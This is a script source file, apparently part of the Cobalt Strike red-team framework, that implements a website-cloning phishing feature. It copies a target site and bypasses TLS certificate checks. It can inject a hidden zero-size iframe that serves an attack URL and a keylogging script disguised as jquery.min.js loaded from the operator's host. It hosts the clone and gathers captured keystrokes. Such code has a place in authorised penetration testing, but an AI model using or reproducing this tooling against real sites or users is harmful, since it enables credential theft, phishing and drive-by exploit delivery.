#
# Web-based Attacks
#

import ui.*;

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.table.*;

import table.*;

import java.awt.*;
import java.awt.event.*;

import java.net.*;
import cloudstrike.*;

sub cloneURLDialog {
	local('$dialog %options @functions $a $b $clone $help $middle');

        $dialog = dialog("Clone Site", 640, 480);

        # pre-set some of the options
	%options['Port']        = '80';
	%options['URIPATH']     = '/';

        # the meat of the form...
        $a = [new JPanel];
        matrixLayout($a, @(
                ui:text("Clone URL:",  "CloneURL", @functions, %options),
                ui:text("Local URI: *",  "URIPATH",  @functions, %options),
                ui:text("Local Port: *", "Port",     @functions, %options),
                ui:attack("Embed:",    "Attack",   @functions, %options)
        ), 3);

	# add a slash to the end of the URI always.
	push(@functions, &fixURIOption);

	$b = ui:checkbox("Log keystrokes on cloned site", "Capture", @functions, %options);

	# buttons?
	$help  = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-website-clone-tool")];

	$clone = ui:action_noclose("Clone", @functions, %options, $dialog, lambda({
		thread(lambda({
			local('$data $status $code $desc $exception');

			[$dialog setVisible: 0];

			try {
				# this is an inline function... it will set $data and use %options['CloneURL']
				cloneURL();
			}
			catch $exception {
				[$dialog setVisible: 1];
				showError("Could not clone: " . %options['CloneURL'] . "\n" . $exception);
				return;
			}

			if ($data eq "") {
				[$dialog setVisible: 1];
				showError("Clone of " . %options['CloneURL'] . " is empty.\nTry to connect with HTTPS instead.");
				return;
			}

			$desc = "Clone of: " . %options['CloneURL'];

			# insert the attack if that's what the user wants...
			if (%options['Attack'] ne "") {
				$code = '<IFRAME SRC="' . %options['Attack'] . '" WIDTH="0" HEIGHT="0"></IFRAME>';
				$data = replace($data, '(?i:\</body\>)', "\n $+ $code $+ \n\$0");
				$desc = "$desc $+ . Serves " . %options['Attack'];

				if ($code !isin $data) {
					$data = "$data $+ $code";
				}
			}

			# insert the code to log keystrokes too...
			if (%options['Capture'] == 1) {
				$code = '<script src="http://' . $MY_ADDRESS . ':' . %options['Port'] . '/jquery/jquery.min.js"></script>';
				$data = replace($data, '(?i:\</body\>)', "\n $+ $code $+ \n\$0");
				$desc = "$desc $+ . Logs keys";

				if ($code !isin $data) {
					$data = "$data $+ $code";
				}
			}

			# try to host site, wait for the result...
			call_async_callback($mclient, "cloudstrike.host_site", $this, %options["Port"], %options["URIPATH"], $data, %options['Capture'], $desc, %options['CloneURL']);
			yield;
			$status = convertAll($1);

			if ($status['status'] eq "success") {
				startedWebService("cloned site", "http:// $+ $MY_ADDRESS $+ :" . %options["Port"] . %options["URIPATH"]);
				elog("cloned " . %options['CloneURL'] . " @ http:// $+ $MY_ADDRESS $+ :" . %options["Port"] . %options["URIPATH"]);
			}
			else {
				[$dialog setVisible: 1];
				showError("Unable to start web server:\n" . $status['status']);
			}
		}, %options => $1, \$dialog));
	}, \$dialog));

        # set up the dialog.
        [$dialog setLayout: [new BorderLayout]];
	[$dialog add: $a];

	$middle = [new JPanel];
	[$middle setLayout: [new BorderLayout]];
	[$middle add: $a, [BorderLayout CENTER]];
	[$middle add: $b, [BorderLayout SOUTH]];

	[$dialog add: description('The site cloner copies a website and fixes the code so images load. You may add exploits to cloned sites or capture data submitted by visitors'), [BorderLayout NORTH]];
	[$dialog add: $middle, [BorderLayout CENTER]];
	[$dialog add: center($clone, $help), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
	[$dialog show];
}

#
# attempts to clone the specified URL
#
inline cloneURL {
	local('$thread $return $x $progress');
	$thread = fork({
		sub cloneAttempt {
			local('$url $yc $handle $text $base');
			$url = [new URL: $1];
			$yc = [$url openConnection];

			if ($yc isa ^javax.net.ssl.HttpsURLConnection) {
				# allow all hostnames...
				[$yc setHostnameVerifier: { return 1; }];

				# trust all certs
				[$yc setSSLSocketFactory: [ssl.SecureSocket getMyFactory: { return 1; }]];
			}

			# just in case anyone is checking...
			[$yc setRequestProperty: "User-Agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)"];

			[$yc setInstanceFollowRedirects: 1];
			$handle = [SleepUtils getIOHandle: [$yc getInputStream], $null];
			$text = readb($handle, -1);
			closef($handle);

			if ([$yc getResponseCode] == 302) {
				return cloneAttempt([$yc getHeaderField: "location"]);
			}
			else if ([$yc getResponseCode] == 301) {
				return cloneAttempt([$yc getHeaderField: "location"]);
			}
			else {
				if (![[$url getFile] endsWith: '/']) {
					local('@parts');
					@parts = split('/', [$url getFile]);
					pop(@parts);
					$base = strrep($1, [$url getFile], join('/', @parts)) . '/';
				}
				else {
					$base = $1;
				}

				# steal the site's favicon as well...
				if ('shortcut icon' !isin lc($text) && 'rel="icon' !isin lc($text)) {
					$text = replace($text, ('(?i:\<head.*?\>)'), "\$0\n<link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"/favicon.ico\">");
				}

				# if the site does not have a base href, insert a new one.
				if ('<base href=' !isin lc($text)) {
					$text = replace($text, ('(?i:\<head.*?\>)'), "\$0\n<base href=\"".$base."\">");
				}

				return $text;
			}
		}

		try {
			return cloneAttempt($input);
		}
		catch $exception {
			writeb($source, $exception);
		}
	}, $input => %options['CloneURL']);

	$progress = [new javax.swing.ProgressMonitor: $null, "Clone URL", %options['CloneURL'], 0, 100];

	for ($x = 0; $x < 100; $x++) {
		try {
			$return = wait($thread, 100);
			$data = $return;
			break;
		}
		catch $exception {
			# ...
		}
		yield 200;
		[$progress setProgress: $x];
	}

	[$progress close];

	if ($x == 100) {
		closef($thread);
		throw "Cloning operation timed out";
	}
	else if ($data is $null) {
		throw readb($thread, available($thread));
	}
}

sub form_submissions {
	local('@r $entry $last $data');
	$last = %(data => "");
	foreach $entry (values(_data_list($1, "cobaltstrike.key_strokes"))) {
		$data = $entry['data'];
		if ([$data startsWith: $last['data']]) {
			$last = $entry;
		}
		else {
			push(@r, $last);
			$last = $entry;
		}
	}

	if ($last['data'] ne "") {
		push(@r, $last);
	}

	return @r;
}
